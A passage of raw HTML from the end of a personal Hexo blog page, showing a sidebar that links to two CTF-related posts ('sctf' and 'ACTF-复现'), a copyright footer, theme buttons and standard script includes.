src="https://raw.githubusercontent.com/1llustrious/img/main/20231130172050.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sctf"></a><div class="content"><a class="title" href="/2023/12/02/sctf/" title="sctf">sctf</a><time datetime="2023-12-02T14:29:09.000Z" title="Created 2023-12-02 22:29:09">2023-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/" title="ACTF-复现"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ACTF-复现"></a><div class="content"><a class="title" href="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/" title="ACTF-复现">ACTF-复现</a><time datetime="2023-12-02T00:12:41.000Z" title="Created 2023-12-02 08:12:41">2023-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2023 By 1llustrious</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/bundle.js"></script></body></html>